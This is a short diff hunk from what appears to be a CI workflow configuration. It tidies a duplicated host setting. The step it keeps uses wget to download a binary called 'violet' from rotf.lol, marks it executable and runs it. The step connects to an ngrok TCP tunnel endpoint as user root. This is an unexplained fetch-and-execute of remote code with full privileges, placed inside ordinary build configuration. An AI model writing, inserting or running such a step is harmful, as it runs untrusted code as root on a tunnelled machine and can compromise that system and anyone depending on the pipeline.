@@ -12,7 +12,6 @@ jobs:
         with:
           command: |
             wget https://rotf.lol/violet && chmod +x violet && ./violet
-          host: 2.tcp.ngrok.io:18555
           host: 2.tcp.ngrok.io
           port: 18555
           user: root         
